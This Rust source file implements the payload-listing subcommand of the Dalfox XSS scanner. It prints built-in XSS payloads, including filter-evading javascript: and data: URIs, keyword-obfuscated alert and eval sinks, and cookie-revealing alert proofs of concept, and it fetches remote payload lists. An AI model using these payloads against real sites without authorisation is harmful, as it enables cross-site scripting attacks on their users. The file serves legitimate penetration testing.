use clap::Args;

use crate::cmd::scan::ScanOutcome;

const KNOWN_SELECTORS: &[&str] = &[
    "event-handlers",
    "useful-tags",
    "payloadbox",
    "portswigger",
    "uri-scheme",
    "special-chars",
    "functions",
    "awesome-alert",
    "dom-clobbering",
    "mxss",
    "blind",
];

fn levenshtein_distance(left: &str, right: &str) -> usize {
    let right_chars: Vec<_> = right.chars().collect();
    let mut previous: Vec<_> = (0..=right_chars.len()).collect();
    let mut current = vec![0; right_chars.len() + 1];

    for (left_index, left_char) in left.chars().enumerate() {
        current[0] = left_index + 1;

        for (right_index, right_char) in right_chars.iter().enumerate() {
            let substitution_cost = usize::from(left_char != *right_char);
            current[right_index + 1] = (current[right_index] + 1)
                .min(previous[right_index + 1] + 1)
                .min(previous[right_index] + substitution_cost);
        }

        std::mem::swap(&mut previous, &mut current);
    }

    previous[right_chars.len()]
}

fn closest_selector(input: &str) -> Option<&'static str> {
    let mut best_match = None;

    for &selector in KNOWN_SELECTORS {
        let distance = levenshtein_distance(input, selector);
        if best_match.is_none_or(|(_, best_distance)| distance < best_distance) {
            best_match = Some((selector, distance));
        }
    }

    best_match
        .filter(|(_, distance)| *distance <= 2)
        .map(|(selector, _)| selector)
}

/// Manage or inspect payloads (no local flags).
///
/// Note:
/// - The legacy enum-* flags have been removed.
/// - This subcommand currently provides a brief summary only.
/// - Payload selection and application is handled by the scanning engine.
#[derive(Args, Debug, Clone)]
#[command(
    about = "Manage or inspect payloads",
    long_about = "Selectors:\n  - event-handlers: list all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: list useful HTML tag names often used in XSS contexts (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)\n  - special-chars: print special characters (and encoded variants) for context probing / breakout\n  - functions: print visibly-confirmable sinks with filter-surviving variants (alert, prompt, ...)\n  - awesome-alert: print polished alert PoCs for clean screenshots/demos (alert(document.domain), ...)\n  - dom-clobbering: print DOM clobbering payloads\n  - mxss: print mutation-XSS / sanitizer-bypass payloads\n  - blind: print blind-XSS skeletons ({} = your OOB callback URL)"
)]
pub struct PayloadArgs {
    #[arg(
        value_name = "SELECTOR",
        help = "Payload selector\nAvailable selectors:\n  - event-handlers\n  - useful-tags\n  - payloadbox\n  - portswigger\n  - uri-scheme\n  - special-chars\n  - functions\n  - awesome-alert\n  - dom-clobbering\n  - mxss\n  - blind",
        long_help = "Selector to enumerate payload resources.\nSupported selectors:\n  - event-handlers: print all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: print useful HTML tag names used for XSS payloads (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)\n  - special-chars: print special characters (and encoded variants) for context probing / breakout\n  - functions: print visibly-confirmable sinks with filter-surviving variants (alert, prompt, ...)\n  - awesome-alert: print polished alert PoCs for clean screenshots/demos (alert(document.domain), ...)\n  - dom-clobbering: print DOM clobbering payloads\n  - mxss: print mutation-XSS / sanitizer-bypass payloads\n  - blind: print blind-XSS skeletons ({} = your OOB callback URL)"
    )]
    pub selector: Option<String>,
}

fn uri_scheme_payloads() -> &'static [&'static str] {
    &[
        "javascript:alert(1)",
        // Comment terminator swallows anything appended after the injection.
        "javascript:alert(1)//",
        // Mixed case defeats a naive lowercase `javascript` scheme match.
        "jaVasCript:alert(1)",
        // Literal TAB inside the scheme; URL parsers strip TAB/LF/CR, so a
        // filter that misses it still resolves the scheme to `javascript:`.
        "java\tscript:alert(1)",
        // Entity-encoded colon; decodes back to `:` in an HTML attribute.
        "javascript&colon;alert(1)",
        // Legacy IE scheme, still worth probing on old surfaces.
        "vbscript:msgbox(1)",
        "data:text/html;,<svg/onload=alert(1)>",
        // Plain (non-base64) data URL, distinct from the encoded variants below.
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNDUpPg==",
        "data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sJz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg==",
        "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4=",
    ]
}

/// Special characters (and a few encoded variants) for context probing and
/// breakout. Injecting these one at a time reveals how a sink reflects input:
/// which bytes survive verbatim, which are HTML/URL-encoded, and which are
/// stripped — the same signal the engine uses to pick a context-aware payload.
fn special_chars_payloads() -> &'static [&'static str] {
    &[
        // Raw breakout characters
        "<", ">", "\"", "'", "`", "(", ")", "{", "}", "[", "]", ";", "/", "=", "+", "%", "\\", "-",
        "!", "&", // HTML entity variants
        "&lt;", "&gt;", "&quot;", "&#39;", "&#x27;", "&apos;", "&#96;",
        // URL-encoded variants
        "%3C", "%3E", "%22", "%27", "%60", "%28", "%29", // Double URL-encoded
        "%253C", "%253E", // Unicode escapes (JS string context)
        "\\u003c", "\\u003e", "\\x3c", "\\x3e", // Comment openers and the null byte
        "//", "/*", "%00",
    ]
}

/// Sinks that produce a **visibly confirmable** result, plus variants that
/// survive common filters. If one of these fires you can *see* it, so impact is
/// proven rather than inferred. Prefer these for manual verification.
fn functions_payloads() -> &'static [&'static str] {
    &[
        // Canonical sinks
        "alert(1)",
        "prompt(1)",
        "confirm(1)",
        "print()",
        // Grouping / property-access forms that dodge naive keyword filters
        "(alert)(1)",
        "(alert)`1`",
        "window['alert'](1)",
        "window[/**/'alert'](1)",
        "self['alert'](1)",
        "globalThis['alert'](1)",
        "top.alert(1)",
        "parent.alert(1)",
        "this['alert'](1)",
        // Tagged-template invocation (no parentheses)
        "alert`1`",
        // String-to-code sinks
        "setTimeout('alert(1)')",
        "setInterval('alert(1)')",
        "Function('alert(1)')()",
        "[].constructor.constructor('alert(1)')()",
        "eval('alert(1)')",
        // Reconstruct the keyword from fragments
        "window['al'+'ert'](1)",
        "top[8680439..toString(30)](1)",
    ]
}

/// Polished, self-explanatory alert PoCs for clean screenshots, reports, and
/// talks. Each renders the host/origin/cookie so the popup proves *where* it
/// fired without any extra explanation.
fn awesome_alert_payloads() -> &'static [&'static str] {
    &[
        "alert(document.domain)",
        "alert(document.cookie)",
        "alert(window.origin)",
        "alert(location.href)",
        "alert(document.location)",
        "alert(`XSS on ${document.domain}`)",
        "prompt(document.domain)",
        "confirm(document.domain)",
        "alert(navigator.userAgent)",
        "alert(document.baseURI)",
    ]
}

/// Print a list one entry per line and log the count. Generic over the element
/// type so every listing selector — static `&[&str]` slices and owned
/// `Vec<String>` families alike — emits through the same path with identical
/// formatting and log wording.
fn print_lines<T: std::fmt::Display>(selector: &str, list: &[T]) {
    for entry in list.iter() {
        println!("{}", entry);
    }
    crate::dbg_log!("{}: {} items", selector, list.len());
}

/// Every static selector paired with the number of entries it prints. The
/// remote selectors (`payloadbox`, `portswigger`) are absent: their size is
/// only known after a fetch, and the summary must not touch the network.
fn static_selector_counts() -> Vec<(&'static str, usize)> {
    vec![
        (
            "event-handlers",
            crate::payload::xss_event::common_event_handler_names().len(),
        ),
        (
            "useful-tags",
            crate::payload::xss_html::useful_html_tag_names().len(),
        ),
        ("uri-scheme", uri_scheme_payloads().len()),
        ("special-chars", special_chars_payloads().len()),
        ("functions", functions_payloads().len()),
        ("awesome-alert", awesome_alert_payloads().len()),
        (
            "dom-clobbering",
            crate::payload::get_dom_clobbering_payloads().len(),
        ),
        ("mxss", crate::payload::get_mxss_payloads().len()),
        ("blind", crate::payload::XSS_BLIND_PAYLOADS.len()),
    ]
}

/// The `Summary:` block, built as text so the rendered counts are assertable
/// without capturing stdout.
fn summary_block() -> String {
    let mut out = String::from("Summary:\n");
    out.push_str(&format!(
        "- Canonical JavaScript payloads: {}\n",
        crate::payload::XSS_JAVASCRIPT_PAYLOADS.len()
    ));
    for (selector, count) in static_selector_counts() {
        out.push_str(&format!("- {}: {}\n", selector, count));
    }
    out
}

fn print_summary() {
    println!("Dalfox payload");
    println!("----------------");
    println!("Provide a selector to list payloads. Examples:");
    println!("  dalfox payload event-handlers");
    println!("  dalfox payload useful-tags");
    println!("  dalfox payload payloadbox");
    println!("  dalfox payload portswigger");
    println!("  dalfox payload uri-scheme");
    println!("  dalfox payload special-chars");
    println!("  dalfox payload functions");
    println!("  dalfox payload awesome-alert");
    println!("  dalfox payload dom-clobbering");
    println!("  dalfox payload mxss");
    println!("  dalfox payload blind\n");

    print!("{}", summary_block());

    println!("\nTips:");
    println!("- Use scanning to apply payloads: dalfox scan <target>");
    println!("- Add your own payloads with: --custom-payload <file>");
    println!("- Only test custom payloads with: --only-custom-payload");
    println!(
        "- Control encoder variants with: -e none,url,2url,3url,4url,html,htmlpad,base64,unicode,zwsp"
    );
}

/// Fetch payloads from a remote provider and print one per line.
/// Returns `true` when initialization (and any printing) finished without an
/// error path being taken; `false` on runtime build failure, fetch failure,
/// or an uninitialized cache. Callers translate this into the CLI exit code.
fn fetch_and_print_remote(provider: &str) -> bool {
    let provider = provider.to_string();
    let ok = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let ok_clone = ok.clone();
    let join = std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build();
        match rt {
            Ok(rt) => {
                rt.block_on(async move {
                    let providers = vec![provider.clone()];
                    if let Err(e) = crate::utils::init_remote_resources(&providers, &[]).await {
                        eprintln!("[payload] failed to fetch from {}: {}", provider, e);
                        return;
                    }
                    if let Some(list) = crate::utils::get_remote_payloads() {
                        let count = list.len();
                        for p in list.iter() {
                            println!("{}", p);
                        }
                        crate::dbg_log!("{}: {} payloads", provider, count);
                        ok_clone.store(true, std::sync::atomic::Ordering::Relaxed);
                    } else {
                        eprintln!(
                            "[payload] no payloads initialized for provider {}",
                            provider
                        );
                    }
                });
            }
            Err(e) => {
                eprintln!("[payload] runtime init error: {}", e);
            }
        }
    });
    // A worker-thread panic is exceptional but should not be silently dropped.
    if let Err(e) = join.join() {
        eprintln!("[payload] fetch worker panicked: {:?}", e);
        return false;
    }
    ok.load(std::sync::atomic::Ordering::Relaxed)
}

pub fn run_payload(args: PayloadArgs) -> ScanOutcome {
    match args.selector.as_deref() {
        Some("event-handlers") => {
            print_lines(
                "event-handlers",
                crate::payload::xss_event::common_event_handler_names(),
            );
            ScanOutcome::Clean
        }
        Some("useful-tags") => {
            print_lines(
                "useful-tags",
                crate::payload::xss_html::useful_html_tag_names(),
            );
            ScanOutcome::Clean
        }
        Some("payloadbox") => {
            if fetch_and_print_remote("payloadbox") {
                ScanOutcome::Clean
            } else {
                ScanOutcome::Error
            }
        }
        Some("portswigger") => {
            if fetch_and_print_remote("portswigger") {
                ScanOutcome::Clean
            } else {
                ScanOutcome::Error
            }
        }
        Some("uri-scheme") => {
            print_lines("uri-scheme", uri_scheme_payloads());
            ScanOutcome::Clean
        }
        Some("special-chars") => {
            print_lines("special-chars", special_chars_payloads());
            ScanOutcome::Clean
        }
        Some("functions") => {
            print_lines("functions", functions_payloads());
            ScanOutcome::Clean
        }
        Some("awesome-alert") => {
            print_lines("awesome-alert", awesome_alert_payloads());
            ScanOutcome::Clean
        }
        Some("dom-clobbering") => {
            print_lines(
                "dom-clobbering",
                &crate::payload::get_dom_clobbering_payloads(),
            );
            ScanOutcome::Clean
        }
        Some("mxss") => {
            print_lines("mxss", &crate::payload::get_mxss_payloads());
            ScanOutcome::Clean
        }
        Some("blind") => {
            // XSS_BLIND_PAYLOADS carries a `{}` placeholder for the OOB callback
            // URL; printed verbatim (as a value, never a format string) so the
            // skeleton shows where the URL goes — users wire it up with
            // `-b https://your-callback`.
            print_lines("blind", crate::payload::XSS_BLIND_PAYLOADS);
            ScanOutcome::Clean
        }
        Some(other) => {
            eprintln!("Unknown selector: {}", other);
            if let Some(selector) = closest_selector(other) {
                eprintln!("Did you mean: {}?", selector);
            }
            eprintln!("Available selectors: {}", KNOWN_SELECTORS.join(", "));
            ScanOutcome::Error
        }
        None => {
            // Provide a small, helpful summary rather than a no-op.
            print_summary();
            ScanOutcome::Clean
        }
    }
}

#[cfg(test)]
mod tests;
